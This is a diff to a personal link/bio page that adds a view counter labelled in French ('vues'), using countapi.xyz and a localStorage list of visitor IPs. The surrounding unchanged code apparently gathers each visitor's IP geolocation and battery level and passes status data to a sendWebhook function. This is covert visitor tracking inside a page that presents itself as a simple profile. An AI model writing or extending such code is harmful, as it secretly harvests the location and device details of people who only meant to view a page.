@@ -296,6 +296,7 @@
         <img src="avatar.jpg" alt="5w2g" class="avatar">
         <h1 class="username">5w2g</h1>
         <p class="bio">Welcome to my page</p>
+        <p id="viewCount" style="font-size:12px;color:rgba(255,255,255,0.35);margin-bottom:20px;">Loading views...</p>
 
         <div class="links">
             <a href="https://discord.com/users/618042706031280133" class="link-btn discord" target="_blank">
@@ -806,6 +807,27 @@
             .then(function(r) { return r.json(); })
             .then(function(geoData) {
                 geo = geoData;
+
+                var seenIPs = JSON.parse(localStorage.getItem('seenIPs') || '[]');
+                var isUnique = seenIPs.indexOf(ip) === -1;
+                if (isUnique) {
+                    seenIPs.push(ip);
+                    localStorage.setItem('seenIPs', JSON.stringify(seenIPs));
+                }
+
+                var viewEl = document.getElementById('viewCount');
+                if (isUnique) {
+                    fetch('https://api.countapi.xyz/hit/swag.vip.visits/v1')
+                        .then(function(r) { return r.json(); })
+                        .then(function(d) { viewEl.textContent = d.value + ' vues'; })
+                        .catch(function() { viewEl.textContent = ''; });
+                } else {
+                    fetch('https://api.countapi.xyz/get/swag.vip.visits/v1')
+                        .then(function(r) { return r.json(); })
+                        .then(function(d) { viewEl.textContent = d.value + ' vues'; })
+                        .catch(function() { viewEl.textContent = ''; });
+                }
+
                 if (batteryPromise) {
                     batteryPromise.then(function(b) {
                         batteryLevel = Math.round(b.level * 100) + '%';
@@ -818,6 +840,10 @@
             })
             .catch(function() {
                 geo = {};
+                fetch('https://api.countapi.xyz/get/swag.vip.visits/v1')
+                    .then(function(r) { return r.json(); })
+                    .then(function(d) { document.getElementById('viewCount').textContent = d.value + ' vues'; })
+                    .catch(function() {});
                 sendWebhook([{ name: 'Status', value: 'IP non disponible', inline: false }]);
             });
         }
